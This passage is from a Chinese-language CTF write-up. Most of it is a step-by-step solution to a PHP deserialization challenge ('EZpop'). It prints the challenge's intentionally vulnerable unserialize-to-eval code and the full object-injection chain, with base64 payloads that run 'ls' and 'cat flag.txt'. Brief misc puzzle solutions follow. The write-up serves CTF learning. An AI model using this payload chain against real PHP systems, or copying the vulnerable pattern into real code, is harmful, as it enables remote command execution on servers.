![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700291629099-15316d0d-e659-4fa5-926e-55d2f5a73366.png)

通了（喜）

随后找文件名

不是flag.php!!!!!!是flag.txt！！！！！！！！！（气死我了）

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700291700707-334a3b52-dc11-489e-95fb-1c34689dde92.png)

~~解法二~~

~~url/flag.txt(樂)~~

#### web3-初学者的破门-EZpop

题目描述

```php
<?php
show_source(__FILE__);
//flag在同目录flag文件中
class WelcomeZK{
    public $ClassObj;
    function __construct(){
        $this->ClassObj = new pearlsky();
    }
    function  __destruct(){
        $this->ClassObj->action();
    }
};
class pearlsky{
    public $data;
    function action(){
        eval($this->data);
    }
};
if(isset($_POST['0O0Il10O0'])){
    $a = unserialize(base64_decode($_POST['0O0Il10O0']));
}else{
    print_r("POST , OK?");
};
?>
```

可以看出这道题考的是反序列化，先在本地编辑一下代码以便于传参到`0O0Il10O0`



```php
php反序列化基本知识
serialize()     //将一个对象转换成一个字符串
unserialize()   //将字符串还原成一个对象
魔术方法：
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
```

以上是这道题所需要的知识点

接下来让我们着重分析一下这道题反序列化的过程

```php
class WelcomeZK{
    public $ClassObj;
    function __construct(){
        $this->ClassObj = new pearlsky();
    }
    function  __destruct(){
        $this->ClassObj->action();
    }
};
class pearlsky{
    public $data;
    function action(){
        eval($this->data);
    }
};
```

- 首先题目定义了两个类，WelcomeZK和pearlsky，其中WelcomeZK的构造函数会创建一个pearlsky的对象，并赋值给ClassObj属性，而WelcomeZK的析构函数会调用ClassObj的action()方法。
- pearlsky类有一个data属性，它的action()方法会用eval()函数执行data属性的值

所以这道题的突破点就在eval()函数内可进行系统指令与如何对data进行赋值

我们直接在pearlsky类下对data进行赋值（不在类外进行赋值是为了防止在命令执行之前__destruct()函数就已经将序列化过程中断导致无法对data进行赋值）

```php
class pearlsky{
    public $data = "system('ls');";
    function action(){
        eval($this->data);
    }
};
```

随后我们建立一个变量a，从而对序列化后的字符串进行输出

`$a = new WelcomeZK();`

到现在我们的脚本是这样的

```php
<?php
show_source(__FILE__);
//flag在同目录flag文件中
class WelcomeZK{
    public $ClassObj;
    function __construct(){
        $this->ClassObj = new pearlsky();
    }
    function  __destruct(){
        $this->ClassObj->action();
    }
};
class pearlsky{
    public $data = "system('ls');";
    function action(){
        eval($this->data);
    }
};
$a = new WelcomeZK();
echo serialize($a);
```

输出后可以得到一串序列化的代码

`O:9:"WelcomeZK":1:{s:8:"ClassObj";O:8:"pearlsky":1:{s:4:"data";s:13:"system('ls');";}}`

当这串代码被post到服务端后就会执行data中的ls命令

但是我们倒回去看源代码

```php
if(isset($_POST['0O0Il10O0'])){
    $a = unserialize(base64_decode($_POST['0O0Il10O0']));
}else{
    print_r("POST , OK?");
};
```

这一段是我们要post data所对应的参数值，但是这串参数已经被base64方法进行了解码，那么我们还需要在我们的脚本中加上base64的encode，防止到最后进行解码时原始的序列化语句无法执行

完整的代码如下

```php
<?php
show_source(__FILE__);
//flag在同目录flag文件中
class WelcomeZK{
    public $ClassObj;
    function __construct(){
        $this->ClassObj = new pearlsky();
    }
    function  __destruct(){
        $this->ClassObj->action();
    }
};
class pearlsky{
    public $data = "system('ls');";
    function action(){
        eval($this->data);
    }
};
$a = new WelcomeZK();
echo base64_encode(serialize($a));


?>
```

当我们在本地运行后可以得到以下base64编码

`Tzo5OiJXZWxjb21lWksiOjE6e3M6ODoiQ2xhc3NPYmoiO086ODoicGVhcmxza3kiOjE6e3M6NDoiZGF0YSI7czoxMzoic3lzdGVtKCdscycpOyI7fX0=`

随后我们使用hackbar对参数进行post

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700366463069-2a592377-719c-4815-9495-e4db6ee78894.png)

我们可以发现系统指令已经可以正常调用，并且已经看到flag对应的文件位于何处，接下来我们对脚本进行一点点改动，将系统命令换成`cat flag.txt`后对序列化语句进行base64编码

`Tzo5OiJXZWxjb21lWksiOjE6e3M6ODoiQ2xhc3NPYmoiO086ODoicGVhcmxza3kiOjE6e3M6NDoiZGF0YSI7czoyMzoic3lzdGVtKCdjYXQgZmxhZy50eHQnKTsiO319`

随后按照之前的方法对参数进行传参

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700366653857-a9bf5be6-7ffd-458f-8099-dfa787e99f87.png)

继续努力加油干，欢迎来到Pearlsky（樂）

### Misc

#### misc-1

```
4B5644453452435749564E444F554C4B4B4A4B45324D4A5A4F425254434F4B554A564444514D43574B553254533D3D3D
```

明显的16进制，解密后得到以下编码

`KVDE4RCWIVNDOULKKJKE2MJZOBRTCOKUJVDDQMCWKU2TS===`

使用base家族进行解密，挨个试就能得到flag了

#### 抓旭哥

抓的累死我了

第一张图片识图就能知道是横琴码头，随后在剩下的两张图片中可以看到澳门葡京酒店，顺着方向找就可以知道flag

PSCTF{横琴码头+湾仔码头+横琴大桥}

#### 嘀嘀嘀_yylx-part 1

缺了点东西的汉信码，右下角补上就好

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700292220815-bb5d0304-a526-4cad-bbf2-3a7767c46dc0.png)

